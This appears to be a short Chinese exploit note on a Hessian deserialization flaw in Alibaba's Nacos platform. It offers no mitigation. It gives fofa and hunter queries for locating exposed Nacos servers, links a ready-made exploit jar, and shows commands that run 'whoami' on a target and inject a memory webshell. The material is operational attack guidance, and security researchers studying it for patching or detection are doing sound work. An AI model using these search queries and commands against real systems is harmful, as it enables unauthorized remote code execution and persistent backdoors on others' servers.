# Nacos存在 Hessian反序列化漏洞

# <font style="color:rgb(51, 51, 51);">一、漏洞简介</font>
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos存在 Hessian反序列化漏洞</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">Nacos </font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ fofa `icon_hash="13942501"`
+ 特征

![1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937.png](./img/978s9GPtdTqLqp3h/1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937-011081.png)

# 四、漏洞复现
[NacosRce_jar.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/29512878/1730102385394-3297bb1d-0432-46be-b3dd-d879623eb40a.zip)

执行命令

```plain
java -jar NacosRce.jar http://127.0.0.1:8848/nacos 7848 "whoami"
```

![1728962458168-988ba965-1598-420c-ba8b-0f2eae91f733.png](./img/978s9GPtdTqLqp3h/1728962458168-988ba965-1598-420c-ba8b-0f2eae91f733-214348.png)

打入内存马

```plain
java -jar NacosRce.jar http://127.0.0.1:8848/nacos 7848 memshell
```





> 更新: 2024-10-28 15:59:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ziymxgvn5011of96>